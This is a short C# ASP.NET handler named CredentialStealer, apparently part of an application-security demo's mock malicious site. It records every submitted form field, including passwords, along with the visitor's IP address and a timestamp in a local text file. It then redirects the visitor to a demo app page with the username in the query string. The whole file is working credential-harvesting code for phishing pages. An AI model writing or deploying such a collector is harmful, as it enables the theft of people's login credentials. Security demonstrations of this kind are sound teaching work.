using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web;

namespace MaliciousSite
{
	/// <summary>
	/// Summary description for CredentialStealer
	/// </summary>
	public class CredentialStealer : IHttpHandler
	{
		private const string FILENAME = @"C:\New folder\somemalicioussite\Data\CredentialData.txt";

		public void ProcessRequest(HttpContext context)
		{
			var lines = new List<string>();

			foreach (var key in context.Request.Form.AllKeys)
			{
				var line = string.Format("{0} @ {1} {2}: {3} - {4}", context.Request.UserHostAddress,
					DateTime.Now.ToShortDateString(), DateTime.Now.ToShortTimeString(),
					key, context.Request.Form[key]);

				lines.Add(line);
			}

			using (var file = File.AppendText(FILENAME))
			{
				lines.ForEach(line => file.WriteLine(line));

				file.Flush();
			}

			var username = context.Request.Form["username"] ?? string.Empty;

			context.Response.Redirect("http://app-sec-demo.herokuapp.com/vote-search?username=" + username);
		}

		public bool IsReusable
		{
			get
			{
				return false;
			}
		}
	}
}